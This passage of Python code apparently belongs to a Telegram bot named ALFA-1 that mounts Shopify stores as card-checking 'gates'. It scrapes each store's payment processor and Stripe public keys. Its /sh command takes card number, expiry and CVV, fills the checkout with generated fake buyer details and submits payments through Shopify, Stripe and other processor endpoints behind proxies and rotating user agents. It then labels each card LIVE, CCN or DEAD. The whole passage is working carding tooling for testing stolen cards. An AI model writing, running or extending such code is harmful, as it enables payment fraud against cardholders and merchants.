                            if price < cheapest_price and variant.get("available", True):
                                cheapest_price = price
                                cheapest = {
                                    "variant_id": variant["id"],
                                    "price": price,
                                    "title": product.get("title", ""),
                                }
                    return cheapest
        except Exception as exc:
            logger.warning("Error /products.json: %s", exc)
            return None

    def _country_from_checkout_html(self, html: str) -> str:
        """Detecta país desde el HTML del checkout de Shopify (clase field__input-wrapper--select)."""
        soup = BeautifulSoup(html, "html.parser")
        selector_div = soup.find("div", {"class": lambda c: c and "field__input-wrapper--select" in c})
        text = str(selector_div) if selector_div else html[:3000]
        if "Australia" in text:
            return "AU"
        if "United Kingdom" in text or "England" in text:
            return "GB"
        if "Canada" in text:
            return "CA"
        return "US"

    def _interpret_shopify_response(
        self, final_url: str, notice_text: str
    ) -> Dict[str, Any]:
        """Interpreta la respuesta del checkout de Shopify al parseo HTML."""
        u = str(final_url)
        n = notice_text.strip()

        if "/thank_you" in u or "/orders/" in u or "/post_purchase" in u:
            return {"status": "LIVE AUTH", "message": "Approved — Charge completado"}

        if "/3d_secure_2/" in u or "3d_secure" in u:
            return {"status": "LIVE AUTH", "message": "Approved 3D Secure"}

        cvv_live = [
            "cvv2 mismatch", "card issuer declined cvv", "security code was not matched",
            "cvv validation error", "cvv2/cid/cvc2 data not verified",
            "cvv2/vak failure", "security codes does not match",
        ]
        for kw in cvv_live:
            if kw in n.lower():
                return {"status": "CCN AUTH", "message": n or "CVV mismatch — CCN válido"}

        funds_live = [
            "insufficient funds", "transaction normal - insufficient funds",
            "address not verified - insufficient funds", "cvv2/cid/cvc2 data not verified - insufficient funds",
        ]
        for kw in funds_live:
            if kw in n.lower():
                return {"status": "LIVE AUTH", "message": n or "Insufficient Funds — tarjeta válida"}

        avs_live = [
            "address not verified - approved", "address not verified",
            "avs mismatch",
        ]
        for kw in avs_live:
            if kw in n.lower():
                return {"status": "LIVE AUTH", "message": n or "AVS mismatch — tarjeta válida"}

        if not n:
            return {"status": "DEAD AUTH", "message": "Sin respuesta del checkout"}

        return {"status": "DEAD AUTH", "message": n}

    async def _validate_via_http_shopify_checkout(
        self, card_number: str, exp_month: str, exp_year: str, cvc: str
    ) -> Dict[str, Any] | None:
        """
        Flujo HTTP puro via deposit.us.shopifycs.com/sessions para checkouts
        old-style de Shopify. Devuelve None si detecta checkout new-style (/cn/)
        para que el caller caiga a Browserless.
        """
        if not self.current_gate:
            return None

        parsed = urlparse(self.current_gate)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        domain = parsed.netloc

        variant = await self._get_cheapest_variant(base_url)
        if not variant:
            return None

        proxy = _proxy_url()
        start = time.time()
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": self.ua_manager.get_random(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        kw: Dict[str, Any] = {"timeout": aiohttp.ClientTimeout(total=20), "allow_redirects": True}
        if proxy:
            kw["proxy"] = proxy

        try:
            async with aiohttp.ClientSession(headers=headers) as sess:
                # 1. Agregar al carrito
                await sess.post(f"{base_url}/cart/add.js",
                                data={"id": str(variant["variant_id"])}, **kw)

                # 2. Ir a checkout → seguir redirecciones → obtener checkout_url
                resp2 = await sess.post(f"{base_url}/checkout/", **kw)
                checkout_url = str(resp2.url)

                # New-style checkout (Shopify Hydrogen / Headless) → no es posible HTTP
                if "/checkouts/cn/" in checkout_url or "shopify.com/checkouts" in checkout_url:
                    return None

                # 3. Leer HTML del checkout para detectar país
                html3 = await resp2.text()
                country = self._country_from_checkout_html(html3)
                user_data = self._generate_user_data(country)

                # 4. Enviar info de contacto + dirección → avanzar a shipping_method
                atoken = uuid.uuid4().hex * 2 + uuid.uuid4().hex[:22]  # 86 chars aprox
                payload2 = [
                    ("_method", "patch"),
                    ("authenticity_token", atoken),
                    ("previous_step", "contact_information"),
                    ("step", "shipping_method"),
                    ("checkout[email]", user_data["email"]),
                    ("checkout[buyer_accepts_marketing]", "0"),
                    ("checkout[shipping_address][first_name]", user_data["first_name"]),
                    ("checkout[shipping_address][last_name]", user_data["last_name"]),
                    ("checkout[shipping_address][company]", ""),
                    ("checkout[shipping_address][address1]", user_data["address"]),
                    ("checkout[shipping_address][address2]", ""),
                    ("checkout[shipping_address][city]", user_data["city"]),
                    ("checkout[shipping_address][country]", country),
                    ("checkout[shipping_address][province]", ""),
                    ("checkout[shipping_address][zip]", user_data["postal_code"]),
                    ("checkout[shipping_address][phone]", ""),
                    ("checkout[remember_me]", "0"),
                    ("checkout[client_details][browser_width]", "1280"),
                    ("checkout[client_details][browser_height]", "800"),
                    ("checkout[client_details][javascript_enabled]", "1"),
                    ("checkout[client_details][color_depth]", "24"),
                    ("checkout[client_details][java_enabled]", "false"),
                    ("checkout[client_details][browser_tz]", "300"),
                ]
                await sess.post(checkout_url, data=payload2, **kw)

                # 5. Obtener método de envío
                ship_html = await (await sess.get(
                    checkout_url + "?previous_step=contact_information&step=shipping_method", **kw
                )).text()
                ship_soup = BeautifulSoup(ship_html, "html.parser")
                ship_div = ship_soup.find("div", {"class": "radio-wrapper"})
                if ship_div and ship_div.get("data-shipping-method"):
                    price_send = ship_div["data-shipping-method"]
                else:
                    price_send = "shopify-Standard Shipping-0.00"

                # 6. Seleccionar método de envío → avanzar a payment_method
                payload3 = {
                    "_method": "patch",
                    "authenticity_token": atoken,
                    "previous_step": "shipping_method",
                    "step": "payment_method",
                    "checkout[shipping_rate][id]": price_send,
                    "checkout[client_details][browser_width]": "1280",
                    "checkout[client_details][browser_height]": "800",
                    "checkout[client_details][javascript_enabled]": "1",
                    "checkout[client_details][color_depth]": "24",
                    "checkout[client_details][java_enabled]": "false",
                    "checkout[client_details][browser_tz]": "300",
                }
                await sess.post(checkout_url, data=payload3, **kw)

                # 7. Leer página de pago → gateway ID + precio final
                pay_html = await (await sess.get(
                    checkout_url + "?previous_step=shipping_method&step=payment_method", **kw
                )).text()
                pay_soup = BeautifulSoup(pay_html, "html.parser")

                gateway_el = pay_soup.find("ul", {"role": "list"})
                idpay = gateway_el.get("data-brand-icons-for-gateway", "") if gateway_el else ""
                if not idpay:
                    return None  # No podemos continuar sin gateway ID

                price_span = pay_soup.find(
                    "span", {"class": lambda c: c and "total-recap__final-price" in c}
                )
                price_final = ""
                if price_span:
                    price_final = price_span.get("data-checkout-payment-due-target", "")

                # 8. Tokenizar tarjeta en deposit.us.shopifycs.com/sessions
                card_name = user_data.get("name", "Anna Smith")
                card_formatted = (f"{card_number[:4]} {card_number[4:8]} "
                                  f"{card_number[8:12]} {card_number[12:16]}")
                session_payload = {
                    "credit_card": {
                        "number": card_formatted,
                        "name": card_name,
                        "month": str(exp_month),
                        "year": str(exp_year),
                        "verification_value": cvc,
                    },
                    "payment_session_scope": domain,
                }
                sess6_kw: Dict[str, Any] = {"timeout": aiohttp.ClientTimeout(total=10), "json": session_payload}
                if proxy:
                    sess6_kw["proxy"] = proxy
                sess6_resp = await sess.post("https://deposit.us.shopifycs.com/sessions", **sess6_kw)
                sess6_data = await sess6_resp.json(content_type=None)
                session_id = sess6_data.get("id", "")
                if not session_id:
                    return None

                # 9. Submit pago final
                payload5 = {
                    "_method": "patch",
                    "authenticity_token": atoken,
                    "previous_step": "payment_method",
                    "step": "",
                    "s": session_id,
                    "checkout[payment_gateway]": str(idpay),
                    "checkout[credit_card][vault]": "false",
                    "checkout[different_billing_address]": "false",
                    "checkout[total_price]": str(price_final),
                    "complete": "1",
                    "checkout[client_details][browser_width]": "1280",
                    "checkout[client_details][browser_height]": "800",
                    "checkout[client_details][javascript_enabled]": "1",
                    "checkout[client_details][color_depth]": "24",
                    "checkout[client_details][java_enabled]": "false",
                    "checkout[client_details][browser_tz]": "300",
                }
                resp7 = await sess.post(checkout_url, data=payload5, **kw)
                processing_url = str(resp7.url)

                # 10. Seguir URL de procesamiento
                try:
                    resp8 = await sess.get(processing_url + "?from_processing_page=1", **kw)
                    resp9 = await sess.get(str(resp8.url), **kw)
                    final_url = str(resp9.url)
                    final_html = await resp9.text()
                except Exception:
                    final_url = processing_url
                    final_html = ""

                # 11. Parsear resultado
                notice_el = BeautifulSoup(final_html, "html.parser").find(
                    class_=lambda c: c and "notice__text" in c
                )
                notice_text = notice_el.get_text(strip=True) if notice_el else ""

                result = self._interpret_shopify_response(final_url, notice_text)
                elapsed = round(time.time() - start, 2)
                return {
                    **result,
                    "stripe_code": "",
                    "validation_time": elapsed,
                    "via_browserless": False,
                    "via_http_checkout": True,
                    "card_details": {},
                    "token_id": session_id,
                    "product_price": variant.get("price", 0),
                }

        except Exception as exc:
            logger.warning("Error HTTP shopify checkout: %s", exc)
            return None

    async def _validate_via_browserless_checkout(
        self, card_number: str, exp_month: str, exp_year: str, cvc: str
    ) -> Dict[str, Any]:
        """Valida tarjeta navegando el checkout real de Shopify con Browserless."""
        start = time.time()
        if not self.current_gate:
            return {"status": "ERROR AUTH", "message": "No hay gate montado", "via_checkout": True, "via_browserless": True}

        token = _browserless_token()
        if not token:
            return {"status": "ERROR AUTH", "message": "BROWSERLESS_TOKEN no configurado", "via_checkout": True, "via_browserless": True}

        parsed = urlparse(self.current_gate)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        variant = await self._get_cheapest_variant(base_url)
        if not variant:
            return {"status": "ERROR AUTH", "message": "No se encontró producto disponible en la tienda", "via_checkout": True, "via_browserless": True}

        user_data = self.gate_config.get("user_data") or self._generate_user_data("US")
        api_url = f"{_browserless_endpoint().rstrip('/')}/function"
        payload = {
            "code": _BL_CHECKOUT_FUNCTION,
            "context": {
                "storeUrl": base_url,
                "variantId": variant["variant_id"],
                "card": {"number": card_number, "exp_month": exp_month, "exp_year": exp_year, "cvc": cvc},
                "userData": user_data,
            },
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    api_url, params={"token": token}, json=payload,
                    timeout=aiohttp.ClientTimeout(total=120),
                ) as resp:
                    if resp.status != 200:
                        return {"status": "ERROR AUTH", "message": f"Browserless respondió {resp.status}", "via_checkout": True, "via_browserless": True}
                    raw = await resp.json()
                    inner = raw.get("data", raw) if isinstance(raw, dict) else {}
            elapsed = round(time.time() - start, 2)
            return {
                "status": inner.get("status", "ERROR AUTH"),
                "message": inner.get("message", "Unknown"),
                "stripe_code": "",
                "validation_time": elapsed,
                "via_browserless": True,
                "via_checkout": True,
                "card_details": {},
                "token_id": "",
            }
        except Exception as exc:
            logger.error("Error checkout automation: %s", exc)
            return {"status": "ERROR AUTH", "message": str(exc), "via_checkout": True, "via_browserless": True}

    async def _real_shopify_frontend_validation(
        self, card_number: str, exp_month: str, exp_year: str, cvc: str
    ) -> Dict[str, Any]:
        """Valida tarjeta: directo por procesador → Browserless como fallback."""
        processor = self.gate_config.get("processor", "UNKNOWN")

        if processor in _UNSUPPORTED_PROCESSORS:
            return {
                "status": "ERROR AUTH",
                "message": f"Procesador {processor} no soportado — redirige fuera de Shopify",
                "stripe_code": "",
                "validation_time": 0,
                "via_browserless": False,
                "via_checkout": False,
                "card_details": {},
                "token_id": "",
            }

        start = time.time()
        public_keys = self.gate_config.get("public_keys", [])

        # Braintree → tokenización GraphQL directa → Browserless fallback
        if processor == "BRAINTREE":
            result = await self._validate_via_braintree_direct(card_number, exp_month, exp_year, cvc)
            if result is not None:
                return result
            return await self._validate_via_browserless_checkout(card_number, exp_month, exp_year, cvc)

        # Authorize.net → Accept.js tokenización → submit Shopify → Browserless fallback
        if processor == "AUTHORIZE.NET":
            result = await self._validate_via_authnet_direct(card_number, exp_month, exp_year, cvc)
            if result is not None:
                return result
            return await self._validate_via_browserless_checkout(card_number, exp_month, exp_year, cvc)

        # Adyen → Browserless con intercepción API Adyen
        if processor == "ADYEN":
            return await self._validate_via_adyen_direct(card_number, exp_month, exp_year, cvc)

        # UNKNOWN sin pk_ → Browserless checkout genérico
        if processor == "UNKNOWN" and not public_keys:
            return await self._validate_via_browserless_checkout(card_number, exp_month, exp_year, cvc)

        # SHOPIFY_PAYMENTS → intentar flujo HTTP puro primero (más rápido y sin surface restrictions)
        if processor == "SHOPIFY_PAYMENTS":
            http_result = await self._validate_via_http_shopify_checkout(
                card_number, exp_month, exp_year, cvc
            )
            if http_result is not None:
                return http_result
            # Si devuelve None (checkout new-style), cae a Browserless

        # STRIPE / SHOPIFY_PAYMENTS con pk_ → Stripe API directo
        if not public_keys:
            # Sin pk_ pero SHOPIFY_PAYMENTS → intentar igual el HTTP checkout como fallback
            if processor == "SHOPIFY_PAYMENTS":
                http_result = await self._validate_via_http_shopify_checkout(
                    card_number, exp_month, exp_year, cvc
                )
                if http_result is not None:
                    return http_result
            return {
                "status": "ERROR AUTH",
                "message": "No se encontró pk_ Stripe en el gate.",
                "stripe_code": "",
                "validation_time": round(time.time() - start, 2),
                "card_details": {},
                "via_browserless": False,
            }

        pk = public_keys[0]
        proxy = _proxy_url() or self.proxy_manager.get_proxy()
        timeout = aiohttp.ClientTimeout(total=15)

        origin = ""
        if self.current_gate:
            try:
                p = urlparse(self.current_gate)
                origin = f"{p.scheme}://{p.netloc}"
            except Exception:
                pass

        stripe_account = self.gate_config.get("stripe_account") or ""
        if not stripe_account:
            gate_content = self.gate_config.get("raw_content", "")
            if gate_content:
                acct_match = re.search(r'acct_[A-Za-z0-9]+', gate_content)
                if acct_match:
                    stripe_account = acct_match.group(0)

        # PaymentIntents flow: buscar client_secret (en gate_config o fetcheando el checkout)
        client_secret = self.gate_config.get("client_secret") or ""
        if not client_secret and public_keys:
            # El client_secret vive en el checkout, no en la página principal — fetchearlo ahora
            client_secret = await self._fetch_checkout_client_secret() or ""
            if client_secret:
                self.gate_config["client_secret"] = client_secret
        if client_secret and public_keys:
            pi_result = await self._validate_via_payment_intent(
                pk, client_secret, card_number, exp_month, exp_year, cvc, stripe_account
            )
            if pi_result is not None:
                pi_result["via_payment_intent"] = True
                return pi_result
            # fallback a tokens si PI falla inesperadamente

        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        headers = {
            "Authorization": f"Bearer {pk}",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": self.ua_manager.get_random(),
            "Origin": origin or "https://js.stripe.com",
            "Referer": self.current_gate or origin or "https://js.stripe.com/",
        }

        # /v1/payment_methods — API Elements v3, no tiene surface restrictions
        pm_payload = aiohttp.FormData()
        pm_payload.add_field("type", "card")
        pm_payload.add_field("card[number]", card_number)
        pm_payload.add_field("card[exp_month]", str(exp_month))
        pm_payload.add_field("card[exp_year]", str(exp_year))
        pm_payload.add_field("card[cvc]", cvc)
        pm_payload.add_field("guid", guid)
        pm_payload.add_field("muid", muid)
        pm_payload.add_field("sid", sid)
        pm_payload.add_field("payment_user_agent", "stripe.js/acacia; stripe-js-v3/acacia; payment-element")
        pm_payload.add_field("referrer", self.current_gate or origin or "")
        pm_payload.add_field("time_on_page", str(random.randint(8000, 30000)))
        if stripe_account:
            pm_payload.add_field("_stripe_account", stripe_account)

        self.request_stats["total_requests"] += 1
        pm_data: Dict[str, Any] = {}
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                kw: Dict[str, Any] = {"data": pm_payload, "timeout": timeout}
                if proxy:
                    kw["proxy"] = proxy
                async with session.post("https://api.stripe.com/v1/payment_methods", **kw) as resp:
                    pm_data = await resp.json()
            self.request_stats["successful_requests"] += 1
        except Exception as exc:
            self.request_stats["failed_requests"] += 1
            logger.error("Error petición Stripe /v1/payment_methods: %s", exc)
            return {
                "status": "ERROR AUTH",
                "message": str(exc),
                "stripe_code": "",
                "validation_time": round(time.time() - start, 2),
                "card_details": {},
                "via_browserless": False,
            }

        elapsed = round(time.time() - start, 2)

        # Si pm_ creado con éxito → intentar confirmar PI para obtener respuesta bancaria real
        if "error" not in pm_data and pm_data.get("id", "").startswith("pm_"):
            pm_id = pm_data["id"]
            card_obj = pm_data.get("card", {})
            card_details = {
                "brand": card_obj.get("brand", ""),
                "last4": card_obj.get("last4", "****"),
                "funding": card_obj.get("funding", ""),
                "country": card_obj.get("country", ""),
            }
            # Si tenemos client_secret → confirmar PI con el pm_ recién creado
            if not client_secret:
                client_secret = await self._fetch_checkout_client_secret() or ""
                if client_secret:
                    self.gate_config["client_secret"] = client_secret
            if client_secret:
                pi_result = await self._validate_via_payment_intent(
                    pk, client_secret, card_number, exp_month, exp_year, cvc,
                    stripe_account, pm_id=pm_id
                )
                if pi_result is not None:
                    pi_result["via_payment_intent"] = True
                    pi_result.setdefault("card_details", card_details)
                    return pi_result
            # Sin client_secret — pm_ creado = tarjeta válida (sin respuesta bancaria)
            return {
                "status": "CCN AUTH",
                "message": "Card tokenized — no charge attempted",
                "stripe_code": "",
                "validation_time": elapsed,
                "via_browserless": False,
                "token_id": pm_id,
                "card_details": card_details,
            }

        # Error en payment_methods → interpretar
        err = pm_data.get("error", {})
        code = err.get("code", "")
        msg = err.get("message", "Declined")

        # Surface restriction inesperada → Browserless como último recurso
        if "integration surface" in msg.lower() or code == "integration_surface_unsupported":
            bl_data = await _validate_via_browserless_stripe(
                pk, card_number, exp_month, exp_year, cvc, self.current_gate or ""
            )
            if bl_data is not None:
                elapsed = round(time.time() - start, 2)
                if "error" not in bl_data:
                    card_obj = bl_data.get("card", {})
                    return {
                        "status": "LIVE AUTH",
                        "message": "Approved",
                        "stripe_code": "",
                        "validation_time": elapsed,
                        "via_browserless": True,
                        "token_id": bl_data.get("id", ""),
                        "card_details": {
                            "brand": card_obj.get("brand", ""),
                            "last4": card_obj.get("last4", "****"),
                            "funding": card_obj.get("funding", ""),
                            "country": card_obj.get("country", ""),
                        },
                    }

        if code == "incorrect_cvc":
            status = "CCN AUTH"
        elif code == "card_declined":
            decline_code = err.get("decline_code", "")
            status = "LIVE AUTH" if decline_code in ("insufficient_funds", "insufficient_balance") else "DEAD AUTH"
        elif code in ("expired_card", "invalid_number", "incorrect_number"):
            status = "DEAD AUTH"
        else:
            status = "DEAD AUTH"
        return {
            "status": status,
            "message": msg,
            "stripe_code": code,
            "validation_time": elapsed,
            "via_browserless": False,
            "card_details": {},
        }


# Instancia global
shopify_gate = ShopifyGateManager()

# ── Registro de comandos ────────────────────────────────────────────────────────

def register(alfa_context):
    """Entrypoint ALFA-1."""

    async def tienda(update, context):
        """Handler /tienda — Analiza una tienda Shopify."""
        message = getattr(update, "effective_message", None)
        if message is None:
            return

        args = getattr(context, "args", []) or []
        if not args:
            await message.reply_text("❌ Uso: /tienda <URL>")
            return

        url = args[0].strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        prog_msg = await message.reply_text(
            f"🛒 *ANALIZANDO TIENDA*\n🌐 {url}\n\n`[░░░░░░░░░░] 0%\nIniciando...`",
            parse_mode="Markdown",
        )

        async def update_progress(text: str) -> None:
            try:
                await prog_msg.edit_text(
                    f"🛒 *ANALIZANDO TIENDA*\n🌐 {url}\n\n`{text}`",
                    parse_mode="Markdown",
                )
                await asyncio.sleep(0.4)
            except Exception:
                pass

        try:
            analysis = await shopify_gate._analyze_shopify_page(url, progress_cb=update_progress)
            processor_icons = {
                "STRIPE": "💳 Stripe", "PAYPAL": "💰 PayPal", "ADYEN": "🔄 Adyen",
                "AUTHORIZE.NET": "🔐 Authorize.net", "BRAINTREE": "🧠 Braintree",
                "SHOPIFY_PAYMENTS": "🛒 Shopify Payments", "KLARNA": "🧾 Klarna",
                "AFTERPAY": "💸 Afterpay", "SQUARE": "⬛ Square",
            }
            lines = []
            if analysis.get("is_shopify"):
                lines.append("✅ TIENDA SHOPIFY VÁLIDA")
            else:
                lines.append("❌ NO ES SHOPIFY O NO SE DETECTÓ")
            lines += [
                "",
                f"🏷️ Título: {analysis['page_title'] or 'N/A'}",
                f"🌍 País: {analysis['country']}",
                f"⏱️ Carga: {analysis['load_time']:.2f}s",
                f"📄 Tamaño: {analysis['content_length']:,} bytes",
                "",
                f"💳 Procesador: {processor_icons.get(analysis['processor'], analysis['processor'])}",
            ]
            if analysis["shopify_indicators"]:
                lines += ["", "🔍 INDICADORES:"]
                lines += [f"• {i}" for i in analysis["shopify_indicators"][:5]]
            if analysis["public_keys"]:
                lines += ["", "🔑 CLAVES STRIPE:"]
                lines += [f"• {k[:24]}..." for k in analysis["public_keys"][:2]]
            if analysis["prices_found"]:
                lines += ["", f"💰 Precio mínimo: ${min(analysis['prices_found']):.2f}"]
            if analysis.get("browserless_used"):
                lines.append("🌐 Análisis enriquecido con Browserless")
            if analysis.get("error"):
                lines += ["", f"⚠️ {analysis['error'][:120]}"]
            proc = analysis.get("processor", "UNKNOWN")
            can_mount = (
                analysis["public_keys"]
                or proc in _DIRECT_PROCESSORS
                or proc == "SHOPIFY_PAYMENTS"
            )
            if analysis.get("is_shopify") and can_mount:
                lines.append("\n🚀 USO: /shop <URL> para montar gate")
            elif analysis.get("is_shopify"):
                lines.append("\n⚠️ Shopify detectado pero sin procesador soportado identificado")
            text = "\n".join(lines)
            await prog_msg.edit_text(text[:4000])
        except Exception as exc:
            await prog_msg.edit_text(f"❌ ERROR EN ANÁLISIS\n\n🔧 {str(exc)[:200]}")

    async def shop(update, context):
        """Handler /shop — Monta gate Shopify."""
        message = getattr(update, "effective_message", None)
        if message is None:
            return

        args = getattr(context, "args", []) or []
        if not args:
            await message.reply_text("❌ Uso: /shop <URL>")
            return

        url = args[0].strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        prog_msg = await message.reply_text(
            f"⚙️ *MONTANDO GATE SHOPIFY*\n🌐 {url}\n\n`[░░░░░░░░░░] 0%\nIniciando...`",
            parse_mode="Markdown",
        )

        async def shop_progress(text: str) -> None:
            try:
                await prog_msg.edit_text(
                    f"⚙️ *MONTANDO GATE SHOPIFY*\n🌐 {url}\n\n`{text}`",
                    parse_mode="Markdown",
                )
                await asyncio.sleep(0.4)
            except Exception:
                pass

        try:
            analysis = await shopify_gate._analyze_shopify_page(url, progress_cb=shop_progress)

            if not analysis.get("is_shopify"):
                await prog_msg.edit_text("❌ ERROR: No es tienda Shopify válida o no se detectó Shopify.")
                return

            processor = analysis.get("processor", "UNKNOWN")
            if processor in _UNSUPPORTED_PROCESSORS:
                await prog_msg.edit_text(
                    f"⛔ PROCESADOR NO SOPORTADO\n\n"
                    f"💳 Procesador detectado: {processor}\n\n"
                    f"Este procesador redirige fuera de Shopify para el pago\n"
                    f"y no puede automatizarse.\n\n"
                    f"✅ Procesadores soportados:\n"
                    f"• 💳 Stripe (API directa)\n"
                    f"• 🛒 Shopify Payments (HTTP + Browserless)\n"
                    f"• 🧠 Braintree (GraphQL directo)\n"
                    f"• 🔐 Authorize.net (Accept.js directo)\n"
                    f"• 🔄 Adyen (Browserless con intercepción)"
                )
                return

            if not analysis["public_keys"] and processor not in _DIRECT_PROCESSORS and processor != "UNKNOWN":
                bl_note = "\n🌐 Se intentó render JS con Browserless sin resultado." if _browserless_token() else ""
                await prog_msg.edit_text(
                    f"⚠️ GATE PARCIAL\n\n"
                    f"La tienda usa Shopify pero no se encontró pk_ Stripe expuesta.{bl_note}\n\n"
                    f"💡 Prueba con la URL del checkout directamente."
                )
                return

            shopify_gate.current_gate = url
            shopify_gate.gate_config = analysis

            processor_icons = {
                "STRIPE": "💳 Stripe", "PAYPAL": "💰 PayPal", "ADYEN": "🔄 Adyen",
                "AUTHORIZE.NET": "🔐 Authorize.net", "BRAINTREE": "🧠 Braintree",
                "SHOPIFY_PAYMENTS": "🛒 Shopify Payments",
            }
            processor_modes = {
                "STRIPE": "Stripe API directo",
                "SHOPIFY_PAYMENTS": "HTTP Checkout / Browserless",
                "BRAINTREE": "Braintree GraphQL directo",
                "AUTHORIZE.NET": "Accept.js + Shopify submit",
                "ADYEN": "Browserless + intercepción Adyen API",
                "UNKNOWN": "Browserless Checkout genérico",
            }
            u = analysis["user_data"]
            lines = [
                "✅ GATE AUTO SHOPIFY MONTADO",
                "",
                f"🌐 URL: {url[:60]}..." if len(url) > 60 else f"🌐 URL: {url}",
                f"🌍 País: {analysis['country']}",
                f"⏱️ Carga: {analysis['load_time']:.2f}s",
                f"💳 Procesador: {processor_icons.get(processor, processor)}",
                f"🔑 Claves pk_: {len(analysis['public_keys'])}",
                "",
                "👤 DATOS GENERADOS:",
                f"• Nombre: {u['name']}",
                f"• Email: {u['email']}",
                f"• Ciudad: {u['city']}",
                f"• Moneda: {u['currency']}",
            ]
            if analysis["prices_found"]:
                lines.append(f"• Precio mínimo: ${min(analysis['prices_found']):.2f}")
            if analysis.get("browserless_used"):
                lines.append("\n🌐 pk_ encontrada via Browserless (JS-render)")
            if analysis.get("client_secret"):
                lines.append("🔐 client_secret detectado → PaymentIntents (máxima precisión)")
            if analysis.get("stripe_account"):
                lines.append(f"🏦 Stripe Account: {analysis['stripe_account']}")
            mode = processor_modes.get(processor, "Browserless Checkout")
            if analysis.get("client_secret") and processor in ("STRIPE", "SHOPIFY_PAYMENTS", "UNKNOWN"):
                mode = "Stripe PaymentIntents directo"
            lines.append(f"\n⚙️ Modo: {mode}")
            lines.append("\n🚀 USO: /sh <número|mes|año|cvv>")
            await prog_msg.edit_text("\n".join(lines))
        except Exception as exc:
            await prog_msg.edit_text(f"❌ ERROR AL MONTAR GATE\n\n🔧 {str(exc)[:200]}")

    async def sh(update, context):
        """Handler /sh — Valida tarjeta contra gate Shopify activo."""
        message = getattr(update, "effective_message", None)
        if message is None:
            return

        if not shopify_gate.current_gate:
            await message.reply_text("❌ ERROR: Primero monta un gate con /shop <URL>")
            return

        args = getattr(context, "args", []) or []
        if not args:
            await message.reply_text("❌ Uso: /sh <número|mes|año|cvv>")
            return

        parts = args[0].strip().split("|")
        if len(parts) != 4:
            await message.reply_text("❌ Formato incorrecto. Use: número|mes|año|cvv")
            return

        card_number, exp_month, exp_year, cvv = [p.strip() for p in parts]

        if not shopify_gate._validate_card_number(card_number):
            await message.reply_text("❌ Número de tarjeta inválido (falla Luhn)")
            return

        prog_msg = await message.reply_text(
            "`[░░░░░░░░░░] 0%\n💳 Iniciando validación...`",
            parse_mode="Markdown",
        )

        async def sh_prog(bar: str, label: str) -> None:
            try:
                await prog_msg.edit_text(f"`{bar}\n{label}`", parse_mode="Markdown")
                await asyncio.sleep(0.4)
            except Exception:
                pass

        try:
            await sh_prog("[███░░░░░░░] 30%", "🔍 Consultando BIN...")
            bin_info = shopify_gate._get_bin_info(card_number)

            await sh_prog("[██████░░░░] 60%", "🌐 Enviando a Stripe API...")
            result = await shopify_gate._real_shopify_frontend_validation(
                card_number, exp_month, exp_year, cvv
            )
            await sh_prog("[██████████] 100%", "✅ Validación completada")

            status = result["status"]
            card_det = result.get("card_details", {})

            marca = card_det.get("brand") or bin_info.get("brand", "N/A")
            tipo = card_det.get("funding") or bin_info.get("type", "N/A")
            nivel = bin_info.get("level", "N/A")
            banco = bin_info.get("bank", "N/A")
            telefono = bin_info.get("phone", "N/A")
            pais = card_det.get("country") or bin_info.get("country", "N/A")

            status_icons = {
                "LIVE AUTH": "✅ LIVE AUTH",
                "CCN AUTH": "⚠️ CCN AUTH",
                "DEAD AUTH": "❌ DEAD AUTH",
                "ERROR AUTH": "🔧 ERROR AUTH",
            }
            status_label = status_icons.get(status, f"❓ {status}")

            resultado_map = {
                "LIVE AUTH": "Tarjeta aprobada",
                "CCN AUTH": "Tarjeta existe, CVV incorrecto",
                "DEAD AUTH": "Tarjeta declinada o inválida",
                "ERROR AUTH": "Error de conexión",
            }
            resultado = resultado_map.get(status, status)
            error_code = result.get("stripe_code", "") or "N/A"
            token_id = result.get("token_id", "")
            via_bl = result.get("via_browserless", False)

            cc_monospace = f"`{card_number}|{exp_month}|{exp_year}|{cvv}`"
            sep = "----------------------------"
            lines = [
                sep, "🏛️ ALFA-1 🏛️", sep,
                "⚡ Gates: *AUTO SHOPIFY*",
                "⚡ Comando: *SH*",
                sep,
                f"⚡ CC: {cc_monospace}",
                f"⚡ Status: {status_label}",
                f"⚡ Response: {_esc(result['message'])}",
                f"⚡ Resultado: {_esc(resultado)}",
                f"⚡ Error: {_esc(error_code)}",
            ]
            if token_id:
                lines.append(f"⚡ Token: `{token_id[:24]}...`")
            via_checkout = result.get("via_checkout", False)
            via_pi = result.get("via_payment_intent", False)
            processor_display = shopify_gate.gate_config.get("processor", "UNKNOWN")
            stripe_code = result.get("stripe_code", "")
            if via_pi:
                lines.append("⚡ Método: Stripe PaymentIntents directo")
            elif via_checkout:
                lines.append(f"⚡ Método: Checkout Automation ({_esc(processor_display)})")
                lines.append("⚠️ Confiabilidad reducida vs directo")
            elif stripe_code and stripe_code.startswith("braintree"):
                lines.append("⚡ Método: Braintree GraphQL directo")
            elif stripe_code == "E_WC_15" or (processor_display == "AUTHORIZE.NET" and not via_bl):
                lines.append("⚡ Método: Authorize.net Accept.js directo")
            elif processor_display == "ADYEN" or (via_bl and processor_display == "ADYEN"):
                lines.append("⚡ Método: Adyen Browserless intercepción")
            elif via_bl:
                lines.append("⚡ Método: Browserless Stripe.js")
            lines += [
                sep,
                f"⚡ Marca: {_esc(marca)}",
                f"⚡ Tipo de tarjeta: {_esc(tipo)}",
                f"⚡ Nivel de tarjeta: {_esc(nivel)}",
                f"⚡ Banco: {_esc(banco)}",
                f"⚡ Teléfono: {_esc(telefono)}",
                f"⚡ País: {_esc(pais)}",
                sep,
                "⚡ Desarrollado por:",
                "⚡ @MrMxyzptlk04",
                sep,
                "🏛️ ALFA-1 🏛️",
                sep,
            ]
            await prog_msg.edit_text("\n".join(lines), parse_mode="Markdown")

        except Exception as exc:
            try:
                await prog_msg.edit_text(f"🔧 ERROR EN VALIDACIÓN\n\nDetalles: {str(exc)[:150]}")
            except Exception:
